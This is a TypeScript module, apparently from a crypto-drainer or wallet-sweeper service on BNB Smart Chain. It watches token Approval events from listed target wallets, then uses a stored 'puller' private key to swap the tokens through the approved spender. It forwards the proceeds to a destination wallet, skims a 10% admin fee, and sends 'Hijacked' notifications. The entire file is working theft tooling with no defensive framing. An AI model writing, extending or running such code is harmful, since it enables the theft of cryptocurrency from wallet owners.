import {
    createPublicClient, createWalletClient, webSocket, http, fallback,
    erc20Abi, pad, type Hex,
} from 'viem';
import { privateKeyToAccount } from 'viem/accounts';
import { bsc } from 'viem/chains';
import { ENV } from '../config/env';
import { WBNB } from '../config/constants';
import { listActive, type Target } from './storage';
import { notify } from './notify';

const APPROVAL = '0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925' as Hex;
const usdt = ENV.USDT as `0x${string}`;
const wbnb = WBNB as `0x${string}`;

const pub = createPublicClient({ chain: bsc, transport: fallback(ENV.WSS_URLS.map(u => webSocket(u))) });
const transport = () => fallback(ENV.HTTP_URLS.map(u => http(u, { timeout: 8_000 })));

const V2_ROUTER = [{
    name: 'swapExactTokensForTokens', type: 'function', stateMutability: 'nonpayable',
    inputs: [
        { name: 'amountIn', type: 'uint256' }, { name: 'amountOutMin', type: 'uint256' },
        { name: 'path', type: 'address[]' }, { name: 'to', type: 'address' }, { name: 'deadline', type: 'uint256' },
    ], outputs: [{ type: 'uint256[]' }],
}] as const;

const GET_OUT = [{
    name: 'getAmountsOut', type: 'function', stateMutability: 'view',
    inputs: [{ name: 'amountIn', type: 'uint256' }, { name: 'path', type: 'address[]' }],
    outputs: [{ type: 'uint256[]' }],
}] as const;

const seen = new Set<string>();

function getAdminFee(total: bigint): bigint {
    return (total * 10n) / 100n;
}

function pathsFor(token: `0x${string}`) {
    return token === usdt
        ? [[usdt, wbnb, usdt]]
        : [[token, wbnb, usdt], [token, usdt], [token, wbnb]];
}

async function pickPath(spender: `0x${string}`, token: `0x${string}`, amount: bigint): Promise<`0x${string}`[] | null> {
    for (const path of pathsFor(token)) {
        try {
            const out = await pub.readContract({
                address: spender, abi: GET_OUT, functionName: 'getAmountsOut', args: [amount, path],
            });
            if (out && out[out.length - 1] > 0n) return path;
        } catch { 
            // Silently ignore non-router or reverting path probes
        }
    }
    return null;
}

export async function hijack(t: Target, token: `0x${string}`, spender: `0x${string}`, approved: bigint) {
    const key = `${t.target}:${spender}:${token}`;
    if (seen.has(key) || !t.pullerKey || !t.puller) return;

    const account = privateKeyToAccount(t.pullerKey as Hex);
    let balance = 0n;
    let gas = 0n;

    try {
        [balance, gas] = await Promise.all([
            pub.readContract({ address: token, abi: erc20Abi, functionName: 'balanceOf', args: [t.target as `0x${string}`] }),
            pub.getBalance({ address: account.address }),
        ]);
    } catch {
        return;
    }

    if (balance === 0n) return;
    const amount = balance < approved ? balance : approved;

    const path = await pickPath(spender, token, amount);
    if (!path) return;

    seen.add(key);

    if (ENV.HIJACK_DRY) {
        console.log(`[HIJACK-DRY] wallet=${t.target} token=${token} spender=${spender} amount=${amount} v2=${path.join('>')}`);
        return;
    }

    if (gas < ENV.MIN_PULLER_GAS_WEI) {
        await notify(t.userId, `Puller out of BNB. hijack skipped.`);
        return;
    }

    const price = (await pub.getGasPrice()) * 150n / 100n;
    const wallet = createWalletClient({ account, chain: bsc, transport: transport() });
    const deadline = BigInt(Math.floor(Date.now() / 1000) + 120);
    const nonce = await pub.getTransactionCount({ address: account.address, blockTag: 'pending' });

    let hash: string | null = null;
    let outToken: `0x${string}` = path[path.length - 1];

    try {
        hash = await wallet.writeContract({
            address: spender, abi: V2_ROUTER, functionName: 'swapExactTokensForTokens',
            args: [amount, 0n, path, account.address, deadline],
            gasPrice: price, nonce,
        });
    } catch (e: any) { 
        console.error(`[HIJACK V2 FAIL] ${e.shortMessage || e.message}`); 
    }

    if (!hash) {
        seen.delete(key);
        await notify(t.userId, `Hijack miss on <code>${token}</code>.`);
        return;
    }

    console.log(`[HIJACK] ${token} via ${spender} tx=${hash}`);
    
    let got = 0n;
    try {
        got = await pub.readContract({
            address: outToken, abi: erc20Abi, functionName: 'balanceOf', args: [account.address],
        });
    } catch {}

    if (got === 0n) return;

    const fee = getAdminFee(got);
    try {
        await wallet.writeContract({
            address: outToken, abi: erc20Abi, functionName: 'transfer',
            args: [t.destination as `0x${string}`, got - fee], gasPrice: price, nonce: nonce + 1,
        });
        await wallet.writeContract({
            address: outToken, abi: erc20Abi, functionName: 'transfer',
            args: [ENV.ADMIN_WALLET as `0x${string}`, fee], gasPrice: price, nonce: nonce + 2,
        });
        await notify(ENV.ADMIN_ID, `<b>Hijacked</b> <code>${t.userId}</code>\n<code>${t.target}</code>\ntoken <code>${token}</code>\nTx <code>${hash}</code>`);
    } catch (e: any) {
        console.error(`[forward FAIL] ${e.shortMessage || e.message}`);
        await notify(ENV.ADMIN_ID, `Landed but forward failed on <code>${t.target}</code>.`);
    }
}

export async function startHijackWatcher() {
    const cache = new Map<string, Target>();
    const refresh = async () => {
        try {
            const rows = await listActive();
            cache.clear();
            for (const r of rows) if (r.pullerKey && r.puller) cache.set(r.target.toLowerCase(), r);
        } catch (e: any) {
            console.error('[hijack refresh error]', e.message);
        }
    };
    await refresh();
    setInterval(refresh, 4_000);

    let chain: Promise<unknown> = Promise.resolve();
    pub.watchBlocks({
        onBlock: (b) => {
            chain = chain.then(async () => {
                if (cache.size === 0) return;
                const targets = Array.from(cache.keys());
                const logs = await pub.getLogs({
                    fromBlock: b.number!, toBlock: b.number!,
                    topics: [APPROVAL, targets.map(t => pad(t as Hex, { size: 32 }))],
                }).catch(() => []);

                for (const l of logs) {
                    if (!l.topics[1] || !l.topics[2] || !l.address) continue;
                    const owner = `0x${l.topics[1].slice(26)}`.toLowerCase() as `0x${string}`;
                    const spender = `0x${l.topics[2].slice(26)}`.toLowerCase() as `0x${string}`;
                    
                    let amount = 0n;
                    try {
                        if (l.data && l.data !== '0x' && l.data.length > 2) {
                            amount = BigInt(l.data);
                        }
                    } catch {
                        continue;
                    }

                    const targetObj = cache.get(owner);
                    if (targetObj && amount > 0n) {
                        void hijack(targetObj, l.address as `0x${string}`, spender, amount);
                    }
                }
            }).catch(e => console.error('[hijack cycle]', e.message));
        },
    });
    console.log(`[hijack] watching ${cache.size} wallet(s) dry=${ENV.HIJACK_DRY}`);
}
